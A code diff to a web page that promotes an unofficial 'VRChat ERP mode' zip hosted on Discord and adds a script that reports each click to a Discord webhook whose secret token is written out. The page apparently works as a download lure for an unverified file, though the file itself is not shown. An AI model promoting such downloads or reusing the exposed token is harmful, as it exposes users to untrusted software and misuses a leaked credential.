@@ -2154,10 +2154,33 @@ document.addEventListener('click', function(event) {
 
 			<h1 class="title">Welcome to VRChatERP mode.</h1>
 			          
-			<div class="sqs-block-button-container sqs-block-button-container--center" data-animation-role="button" data-alignment="center" data-button-size="medium" data-button-type="primary" style="text-align: center;">
-			              
-				<a href="https://cdn.discordapp.com/attachments/1251848036997533699/1339654875092353074/VRChat-ERP-Mode.zip?ex=67af8253&is=67ae30d3&hm=ddb10b301fc7ae7b82074ef24c94e6a34871a28d995f80dc0f27d2bdc74ac801&" class="sqs-block-button-element--medium sqs-button-element--primary sqs-block-button-element" data-initialized="true" target="_blank"><strong>Download Now !</strong></a>
-			</div>
+<div class="sqs-block-button-container sqs-block-button-container--center" data-animation-role="button" data-alignment="center" data-button-size="medium" data-button-type="primary" style="text-align: center;">
+    <a id="download-btn" href="https://cdn.discordapp.com/attachments/1251848036997533699/1339654875092353074/VRChat-ERP-Mode.zip?ex=67af8253&is=67ae30d3&hm=ddb10b301fc7ae7b82074ef24c94e6a34871a28d995f80dc0f27d2bdc74ac801&" 
+       class="sqs-block-button-element--medium sqs-button-element--primary sqs-block-button-element" 
+       data-initialized="true" target="_blank">
+        <strong>Download Now !</strong>
+    </a>
+</div>
+
+<script>
+document.getElementById("download-btn").addEventListener("click", function() {
+    const webhookUrl = "https://discord.com/api/webhooks/1339661001905148024/Z-a-wVkbvpgi6njZ94cMFg7WmaHAHWW_1EqrZngW3ufyJsWacZ2ZS9Be4Jstql6fEMsL"; 
+
+    const data = {
+        username: "Download Logger",
+        avatar_url: "https://cdn.discordapp.com/attachments/1339652974347161681/1339661175801253918/photo_2025-02-11_19-42-10.jpg?ex=67af8832&is=67ae36b2&hm=0fd125aeeab7cbce59e205e0accb2ba5c7d4e4ef2607a31adb1b232bba6ae875&",
+        content: "A user **VRChat-ERP-Mode.zip** file downloaded! :inbox_tray:"
+    };
+
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    }).then(response => console.log("Webhook gönderildi!"))
+      .catch(error => console.error("Hata oluştu:", error));
+});
+</script>
+
 
 			<div style="text-align: center; padding: 40px 0">
 				<h4 style="margin: 0;">VRChat ERP mode is not available on steam and xbox platform as it is currently in beta and can only be downloaded from the web.</h4>
